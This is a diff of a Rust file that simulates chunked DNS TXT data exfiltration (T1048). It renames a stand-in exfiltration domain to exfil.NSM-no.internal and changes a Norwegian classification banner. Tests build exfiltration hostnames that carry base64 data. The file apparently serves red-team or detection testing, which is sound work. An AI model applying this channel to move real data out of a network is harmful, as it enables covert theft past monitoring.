@@ -1,4 +1,4 @@
-// STRENGT FORTRIELIG – OMEGA
+// STRENGT FORTROLIG – TS
 //! Exfiltration Channels – DNS TXT Chunked Exfiltration
 //! 
 //! Controlled simulation of large payload exfiltration via DNS TXT record chunking.
@@ -14,7 +14,7 @@ use std::collections::HashMap;
 const MAX_CHUNK_SIZE: usize = 200;
 
 /// DNS TXT Exfiltration Channel with chunking support
-/// Domain structure: chunk{N}of{Total}.{encoded-data}.exfil.ncdd-no.internal
+/// Domain structure: chunk{N}of{Total}.{encoded-data}.exfil.NSM-no.internal
 pub struct DnsTxtExfilChannel {
     /// Base domain for exfiltration
     base_domain: String,
@@ -244,7 +244,7 @@ pub fn run_dns_exfil_scenario() {
     // Simulated payload: 1500 bytes (typical MTU-sized data chunk)
     let payload: Vec<u8> = (0..1500).map(|i| (i % 256) as u8).collect();
     
-    let mut channel = DnsTxtExfilChannel::new("exfil.ncdd-no.internal");
+    let mut channel = DnsTxtExfilChannel::new("exfil.NSM-no.internal");
     
     println!("Initiating DNS TXT exfiltration (T1048)...");
     println!("Payload size: {} bytes", payload.len());
@@ -295,7 +295,7 @@ mod tests {
     
     #[test]
     fn test_fqdn_construction() {
-        let mut channel = DnsTxtExfilChannel::new("exfil.ncdd-no.internal");
+        let mut channel = DnsTxtExfilChannel::new("exfil.NSM-no.internal");
         let chunk = DataChunk {
             sequence: 2,
             total: 5,
@@ -305,7 +305,7 @@ mod tests {
         
         let fqdn = channel.construct_fqdn(&chunk);
         assert!(fqdn.starts_with("chunk2of5.dGVzdC1kYXRh."));
-        assert!(fqdn.ends_with(".exfil.ncdd-no.internal"));
+        assert!(fqdn.ends_with(".exfil.NSM-no.internal"));
     }
     
     #[test]
@@ -319,3 +319,6 @@ mod tests {
         assert_eq!(payload, recovered);
     }
 }
+
+
+
